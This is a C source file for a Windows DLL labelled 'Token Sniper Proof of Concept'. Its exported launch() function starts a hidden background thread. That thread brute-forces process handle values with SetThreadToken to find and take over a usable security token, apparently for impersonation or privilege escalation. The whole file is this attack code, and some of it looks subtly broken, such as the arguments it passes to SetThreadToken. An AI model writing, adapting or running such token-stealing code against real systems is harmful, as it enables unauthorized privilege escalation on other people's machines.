// -------------------
/*
    Token Sniper Proof of Concept
*/
// ------------------

#include "sa7_win.h"
#include <psapi.h>
#include <wchar.h>
#include <string.h>
#include <shlwapi.h>
#include <fcntl.h>     /* for _O_TEXT and _O_BINARY */
#include <windows.h>
#include <aclapi.h>
#include <accctrl.h>
#include <stdio.h>
#include <assert.h>
#include "dumptoken.h"
#define module_name "Token Sniper"

//DWORD WINAPI tokenbruter( LPVOID lpParam );
// For some reason I had to remove the above and do the following to avoid the
// error message below:
unsigned long __stdcall tokenbruter (void *);
/* 
Z:\work\token_sniper>link advapi
32.lib psapi.lib user32.lib kernel32.lib /SECTION:.text,ERW /ENTRY:_DllMainCRTSt
artup@12 /dll /def:token_sniper.def token_sniper.obj
Microsoft (R) Incremental Linker Version 8.00.50727.42
Copyright (C) Microsoft Corporation.  All rights reserved.

   Creating library token_sniper.lib and object token_sniper.exp
token_sniper.obj : error LNK2019: unresolved external symbol "unsigned long __st
dcall tokenbruter(void *)" (?tokenbruter@@YGKPAX@Z) referenced in function "void
 __cdecl starttokenbruter(void)" (?starttokenbruter@@YAXXZ)
token_sniper.dll : fatal error LNK1120: 1 unresolved externals
*/
typedef BOOL (CALLBACK* DumpTokenType)(HANDLE); // This is used for our token helper library

int tokendisplay(HANDLE ProcessPToken){
    return (_DumpToken(ProcessPToken));
}

//DWORD WINAPI tokenbruter(){
unsigned long __stdcall tokenbruter (void *){
    HANDLE ProcessPToken;
    HANDLE hToken,hThread; //the ones we use to bruteforce
    /*
    2. Load up our token display helper libraries.
    3. Begin bruteforcing tokens continuously.
    */
    // For all notifications I am using MessageBoxA manually.
    MessageBoxA(NULL,"Ok inside the tokenbruter() thread...","", MB_OK);
    if (!OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &ProcessPToken)){
        printf("OpenProcessToken failed: error code 0x%lx\n", GetLastError());
        return 1;
    }   

    printf("DUMPING Process primary token\n");
    tokendisplay(ProcessPToken);

// ----------- STEP 3 STARTING NOW ---------------
    hThread = GetCurrentThread();
    if (hThread!=0)
        printf("\nSuccess getting Thread handle...");
    hToken=(void*)0x1;
    //I wonder if there is a way to:
    // 1. Get the type of token from token handle
    // 2. Query if value is a valid handle
    printf("\n\nStarting Token handle search...");
    printf("\n\tIt will look as though this test has quit and returned");
    printf("\n\tbut it is running silently in the background as a thread");
    printf("\n\tand will display a token as soon as it finds one. Leave it running.\n\n");
    while(SetThreadToken(&hThread,hToken)==NULL){
        if (hToken > (void*)0x2710){//I looked it up, Max handles is 10000 (0x2710) in WinXP
            hToken=(void*)0x1; //reset to zero and keep looking
            //printf("."); //print a period for everytime we've completed a pass
        };
        hToken=(void*)((int)hToken+1);
    };
    printf("\nFound A TOKEN that let us SetThreatToken() on it!");
    printf("\nToken was at handle: %08x",hToken);
    tokendisplay(hToken);
    return 0;
};

static void starttokenbruter(void){
    DWORD dwThreadId, dwThrdParam = 1; 
    HANDLE hThread=NULL; 
    MessageBoxA(NULL,"Beginning Token Bruter.....attempting to CreateThread()","", MB_OK);

    hThread = CreateThread( 
        NULL,                        // default security attributes 
        0,                           // use default stack size  
        tokenbruter,                  // thread function 
        NULL,                // argument to thread function 
        0,//CREATE_SUSPENDED,                           // use default creation flags 
        &dwThreadId);                // returns the thread identifier 

   // Check the return value for success. 
   if (hThread == NULL) {
      MessageBoxA(NULL, "CreateThread() FAILED.","", MB_OK);
      //printf( "CreateThread failed (%d)\n", GetLastError() ); 
      return;
   }
   else 
   {
      //MessageBoxA(NULL, "CreateThread() SUCCEEDED.","", MB_OK);
      //printf("\nThread 0x%x Ready.", dwThreadId);
      return;
      //CloseHandle( hThread );
   }
}

__declspec(dllexport) void launch(){
    starttokenbruter();
};

//__declspec(dllexport) void dll_entry(){
BOOLEAN WINAPI DllMain( IN HINSTANCE hDllHandle, 
         IN DWORD     nReason, 
         IN LPVOID    Reserved ){

    return TRUE;
};
